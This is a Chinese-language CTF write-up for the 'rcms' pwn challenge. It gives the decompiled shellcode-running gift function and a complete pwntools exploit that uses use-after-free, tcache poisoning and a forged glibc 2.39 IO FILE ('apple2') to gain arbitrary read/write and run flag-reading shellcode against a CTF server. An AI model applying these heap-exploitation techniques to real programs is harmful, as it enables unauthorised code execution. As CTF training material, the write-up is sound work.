---
layout: post
title: "2025 / das / rcms"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for rcms from das (2025)."
source_folder: "Write-ups/2025/das/rcms"
lang: zh-CN
---
{% raw %}
这题主要难度在泄露libc版本，第一次远程打poison没过有点懵，仔细一想可能是低版本libc，没有指针保护。原题libc为2.27，可以随意两次tc poison泄pie实现任意地址读与任意地址写后，打hook。这里用2.39打。
# 反编译
没有删符号，只需要恢复两个数组。
![QQ20260304-000941](/assets/ctf/906bbf17904bdc219012.webp)
给了一个gift函数直接读shellcode。
```c
unsigned __int64 gift()
{
  int v1; // [rsp+Ch] [rbp-1024h]
  void *buf; // [rsp+10h] [rbp-1020h]
  _BYTE s[4104]; // [rsp+20h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1028h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  memset(s, 0, 0x200u);
  v1 = getpagesize();
  buf = mmap((void *)0x10000, v1, 7, 34, 0, 0);
  if ( buf == (void *)-1LL )
    perror("mmap");
  puts("Congratulations!!");
  puts("we will give u a gift!!");
  puts("what are u want say to me?");
  read(0, buf, 0x200u);
  ((void (*)(void))buf)();
  return __readfsqword(0x28u) ^ v4;
}
```
# 攻击思路

这题限制不多，且很多uaf，直接申请很多chunk泄露libc和heap。然后一次tc poison泄露堆区存的gift函数地址。

一次tc poison打`heap_list[]`获得任意地址泄露与任意地址读取，打apple2。

这里也可以直接一次tc poison打apple2。
# exp：
这里libc版本为2.39，伪造IO file需要写lock（2.38及以上都需要）。
```python
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/pwn"
host = "node5.buuoj.cn"
port = 25707
p = ELF(file)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x, drop=False: io.recvuntil(x, drop=drop)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))


def look(expr):
    frame_globals = globals()
    value = eval(expr, frame_globals)
    print(f"\033[1;94m{expr} -> {hex(value)}\033[0m")
    return value


def cmd(cho):
    sla(b"5.exit", str(cho).encode())


def add(idx, size, data):
    cmd(1)
    sla(b"which one do u want to connect:", str(idx).encode())
    sla(b"how much time do u want:", str(size).encode())
    sla(b"plz input cmd:", data)


def dele(idx):
    cmd(2)
    sla(b"which connection do u want to delet:", str(idx).encode())


def edit(idx, data):
    cmd(3)
    sla(b"which connection do u want to change:", str(idx).encode())
    sla(b"plz input ur cmd:", data)


def view(idx):
    cmd(4)
    sla(b"which connection do u want to show:", str(idx).encode())


def exit():
    cmd(5)


for i in range(10):
    add(i, 0x90, b"")

for i in range(7):
    dele(i + 3)

dele(0)
view(0)
libc.address = uu64(rn(7)[1:]) - 0x203B20
look("libc.address")
dele(2)
view(2)
heap = uu64(rn(7)[1:]) - 0x12D0
look("heap")
aslr = heap >> 4 * 3
edit(9, p64((aslr + 1) ^ (heap + 0x2A0)))
add(10, 0x90, b"")
add(11, 0x90, b"")
view(11)
p.address = uu64(rn(7)[1:]) - 0xF0A
look("p.address")
for i in range(12, 14, 1):
    add(i, 0x40, b"")
for i in range(12, 14, 1):
    dele(i)
edit(13, p64((aslr + 1) ^ (p.address + 0x202040)))
add(14, 0x40, b"")
add(15, 0x40, b"")


def w(addr, data):
    edit(15, p64(addr))
    edit(0, p64(data))


def l(addr):
    edit(15, p64(addr))
    view(0)


"""
for i in range(7):
    l(p.address + 0x201F70 + i * 8)
    leak = uu64(rn(7)[1:])
    look("leak")
"""
ffd = heap + 0x1920
look("ffd")
data = flat(
    {
        0: {
            0x28: 1,
            0x88: libc.address + 0x205700,
            0xA0: ffd + 0x100,
            0xD8: libc.sym["_IO_wfile_jumps"],
        },
        0x100: {
            0x18: 0,
            0x30: 0,
            0xE0: ffd + 0x200,
        },
        0x200: {
            0x68: p.sym["gift"],
        },
    },
    filler=(b"\0"),
).ljust(0x400, b"\0")

add(19, 0x400, data)
dbg("b _IO_flush_all")
w(p.address + 0x2020E0, 0x8)
w(libc.sym["_IO_list_all"], ffd)

exit()
shellcode = shellcraft.amd64.openat(-100, "flag", 0)
shellcode += shellcraft.amd64.mmap(0, 0x100, 1, 1, "rax", 0)
shellcode += f"""
    mov rbx, 0x30
    sub rsp, 16
    mov [rsp], rax
    mov [rsp + 8], rbx
"""
shellcode += shellcraft.amd64.writev(1, "rsp", 1)
shellcode = asm(shellcode)
sla(b"what are u want say to me?", shellcode)

io.interactive()
```
{% endraw %}
